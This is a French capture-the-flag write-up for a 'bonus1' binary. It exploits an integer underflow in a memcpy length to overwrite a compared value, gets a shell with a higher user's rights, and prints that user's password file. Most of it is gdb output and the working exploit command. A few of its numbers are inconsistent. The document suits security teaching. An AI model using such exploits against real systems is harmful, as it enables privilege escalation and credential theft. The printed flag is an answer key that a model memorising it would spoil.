#  Shell Code Exploitation

En décompilant l'exécutable, on remarque que le programme doit passer 2 conditions qui lui permettront de lancer un `shell` avec les droits de bonus2.

La première condition, est que notre premier argument doit-être inférieur à 10. 
Notre deuxième condition est que notre premier argument soit égal à `0x574f4c46` soit `1464814662`en base 10.
```C
arg1 = atoi(argv[1]);
if (arg1 < 10) {
	if (argv[1] == 0x574f4c46)
		execl("/bin/sh");
}
```
Entre ces deux conditions, il y a un `memcpy`, que nous allons utiliser afin de faire notre exploit. 

```C
memcpy(buffer, argv[2], (len(argv[1]) * 4));
```

Voici le prototype de la fonction `memcpy`:
```
void  *memcpy(void  *dest,  const  void  * src,  size_t n)
```
On voit que le troisième argument de `memcpy` est un `size_t`. Le fait que cela soit un size_t va nous être très utile, puisque qu'il n'y a pas de nombre négatif avec ce type. Nous allons donc pouvoir faire un `underflow`

Il va donc falloir qu'on change la valeur de notre premier argument afin qu'elle coincide avec `0x574f4c46`.

Il s'avère qu'on a la possibilité de passer des nombres négatifs comme premier argument. En prenant un nombre très petit, on peut faire un `underflow`. Voyons tout ça dans `gdb`

```
> gdb ./bonus1
(gdb) disass main 
[...]
   0x08048470 <+76>:	mov    %eax,(%esp)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
```
On voit un call a `memcpy`, on va donc break juste après, sur la comparaison  et lancer le programme avec différentes valeurs.
```
(gdb) break *0x08048478
[...]
(gdb) r 8 A
[...]
(gdb) x/50wx $esp
[...]
0xbffff6b0:	0xbffff6c4	0xbffff8e6	0x00000020	0x080482fd
0xbffff6c0:	0xb7fd13e4	0x48530041	0x3d4c4c45	0x6e69622f
0xbffff6d0:	0x7361622f	0x45540068	0x783d4d52	0x6d726574
0xbffff6e0:	0x3635322d	0x00000000	0x080484b9	0x00000008
(gdb) x $esp+0x3c
[...]
0xbffff6ec:	0x00000008
```
On affiche esp juste après l'appel à memcpy, au moment de la comparaison, on peut donc voir `0x00000020`, ce qui donne 32 en decimal. Ce qui correspond donc à notre premier argument après memcpy. La multiplication par 4 dans le `memcpy` fonctionne donc bien.
On retrouve bien notre `8` au moment de la comparaison.
Notre début de buffer est donc à l'adresse `0xbffff6c4`.


Nous voulons maintenant savoir quel valeur nous devons mettre afin que notre programme exécute bien un shell. 
Nous avons notre `adresse de cmp`ainsi que notre adresse de `debut de buffer`.
Nous allons donc faire 
```
[Adresse de cmp]-[buffer]
[0xbffff6ec] - [0xbffff6c4] = 0x28 = 40
```
On peut vérifier cela avec gdb.
```
(gdb)x/50wx $esp
[...]
0xbffff6b0:	0xbffff6c4	0xbffff8e6	0x00000008	0x080482fd
0xbffff6c0:	0xb7fd13e4	0x48530041	0x3d4c4c45	0x080484d1
								^Début de buffer = 0xbffff6c4
0xbffff6d0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff6e0:	0xb7fed280	0x00000000	0x080484b9	0x00000002
											 ^fin de buffer = 0xbffff6ec
```
Si on fait le calcul à la main on a 
```
3 * 4 + 4 * 4 + 3 * 4 = 40
````
Sauf que notre dernière adresse n'est pas pris en compte. On doit donc ajouter 4 pour avoir la bonne taille.

On divise donc 44 / 4 car il sera multiplié par 4 dans le memcpy.
On obtient donc 11. Il va donc falloir multiplier par 11 la valeur de comparaison (`0x574f4c46`) .
Cette valeur de comparaison en little indian est donc `\x46\x4c\x4f\x57`.

On peut maintenant tester avec le `intmin` +  44.
```
-2147483647 + 44 = -2147483603
```

```
(gdb) break *0x08048473
[...]
(gdb) r -2147483607 `python -c 'print "\x46\x4c\x4f\x57"*11'`
[...]
(gdb) continue
[...]
process 3514 is executing new program: /bin/dash
```
Notre programme se lance bien !
```
./bonus1 -2147483607 `python -c 'print "\x46\x4c\x4f\x57"*164'`
[...]
$whoami
[...]
bonus2
$ cat /home/user/bonus2/.pass
[...]
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```